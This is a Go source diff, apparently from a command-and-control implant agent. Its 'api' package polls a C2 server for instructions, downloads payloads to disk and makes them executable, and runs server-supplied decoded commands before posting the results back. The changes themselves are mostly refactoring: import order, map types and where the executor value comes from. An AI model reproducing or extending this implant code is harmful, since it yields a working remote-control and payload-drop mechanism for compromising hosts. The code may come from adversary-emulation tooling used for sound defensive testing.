@@ -2,21 +2,22 @@ package api
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
-	"net/http"
-	"os"
 	"io"
 	"io/ioutil"
-	"time"
-	"runtime"
-	"encoding/json"
+	"net/http"
+	"os"
 	"path/filepath"
-	"../util"
+	"runtime"
+	"time"
+
 	"../execute"
+	"../util"
 )
 
 // Instructions is a single call to the C2
-func Instructions(profile map[string]string) interface{} {
+func Instructions(profile map[string]interface{}) interface{} {
 	data, _ := json.Marshal(profile)
 	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
 	bites := request(address, data)
@@ -42,7 +43,7 @@ func Drop(server string, payload string) {
 		client := &http.Client{}
 		resp, err := client.Do(req)
 		if err == nil {
-			dst, _ := os.Create(location) 
+			dst, _ := os.Create(location)
 			defer dst.Close()
 			_, _ = io.Copy(dst, resp.Body)
 			os.Chmod(location, 0500)
@@ -51,10 +52,11 @@ func Drop(server string, payload string) {
 }
 
 // Execute executes a command and posts results
-func Execute(profile map[string]string, command map[string]interface{}) {
+func Execute(profile map[string]interface{}, command map[string]interface{}) {
 	cmd := string(util.Decode(command["command"].(string)))
 	status := "0"
-	result, err := execute.Execute(cmd, profile["executor"])
+	fmt.Println(command)
+	result, err := execute.Execute(cmd, command["executor"].(string))
 	if err != nil {
 		status = "1"
 	}
